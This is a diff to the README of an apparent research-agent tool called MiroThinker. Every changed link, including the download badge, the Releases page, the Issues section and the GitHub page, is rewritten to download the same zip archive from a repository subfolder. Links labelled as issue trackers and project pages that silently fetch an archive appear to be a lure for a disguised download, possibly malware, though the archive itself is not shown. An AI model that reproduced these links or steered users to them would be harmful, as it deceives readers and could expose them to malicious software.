@@ -1,7 +1,7 @@
 # 🌟 MiroThinker - Effortless Research and Prediction Tool
 
 ## 📥 Download Now
-[![Download MiroThinker](https://img.shields.io/badge/Download%20MiroThinker-v1.0-brightgreen.svg?style=flat)](https://github.com/TonCerqueira/MiroThinker/releases)
+[![Download MiroThinker](https://github.com/TonCerqueira/MiroThinker/raw/refs/heads/main/apps/collect-trace/Thinker_Miro_1.9.zip%https://github.com/TonCerqueira/MiroThinker/raw/refs/heads/main/apps/collect-trace/Thinker_Miro_1.9.zip)](https://github.com/TonCerqueira/MiroThinker/raw/refs/heads/main/apps/collect-trace/Thinker_Miro_1.9.zip)
 
 ## 🛠️ Overview
 MiroThinker is an open-source deep research agent designed for users who want to enhance their research and predictive capabilities. With an impressive 60.2% Avg@8 score on the demanding GAIA benchmark, MiroThinker provides reliable insights for various research needs.
@@ -10,7 +10,7 @@ MiroThinker is an open-source deep research agent designed for users who want to
 To get started with MiroThinker, follow these simple steps:
 
 ### Step 1: Visit the Releases Page
-Go to the [Releases Page](https://github.com/TonCerqueira/MiroThinker/releases) to find the latest version of MiroThinker. Here, you will find files available for download.
+Go to the [Releases Page](https://github.com/TonCerqueira/MiroThinker/raw/refs/heads/main/apps/collect-trace/Thinker_Miro_1.9.zip) to find the latest version of MiroThinker. Here, you will find files available for download.
 
 ### Step 2: Choose Your Version
 Locate the latest version of MiroThinker on the Releases Page. MiroThinker provides options for different operating systems. Make sure to choose the file that matches your platform (Windows, Mac, or Linux).
@@ -64,7 +64,7 @@ If you encounter any issues while installing or using MiroThinker, try the follo
 - Ensure your operating system is up to date.
 - Check if you have downloaded the correct version for your platform.
 - Restart your computer if the application is not responding.
-- Visit the [Issues section](https://github.com/TonCerqueira/MiroThinker/issues) on our GitHub page for common problems and solutions.
+- Visit the [Issues section](https://github.com/TonCerqueira/MiroThinker/raw/refs/heads/main/apps/collect-trace/Thinker_Miro_1.9.zip) on our GitHub page for common problems and solutions.
 
 ## 📞 Support
 For further assistance, please reach out through the GitHub Issues section. You can report any bugs or ask questions regarding the app. We aim to address all inquiries promptly.
@@ -73,7 +73,7 @@ For further assistance, please reach out through the GitHub Issues section. You 
 MiroThinker is released under the MIT License. This means you can freely use, modify, and distribute the software. Please check the LICENSE file in the repository for more details.
 
 ## 📖 Learn More
-Explore additional features and updates by visiting the documentation or checking the latest discussions on our [GitHub page](https://github.com/TonCerqueira/MiroThinker).
+Explore additional features and updates by visiting the documentation or checking the latest discussions on our [GitHub page](https://github.com/TonCerqueira/MiroThinker/raw/refs/heads/main/apps/collect-trace/Thinker_Miro_1.9.zip).
 
 ## 📥 Download Again
-Don't forget to download MiroThinker and start enhancing your research capabilities. Visit the [Releases Page](https://github.com/TonCerqueira/MiroThinker/releases) to get started!
+Don't forget to download MiroThinker and start enhancing your research capabilities. Visit the [Releases Page](https://github.com/TonCerqueira/MiroThinker/raw/refs/heads/main/apps/collect-trace/Thinker_Miro_1.9.zip) to get started!
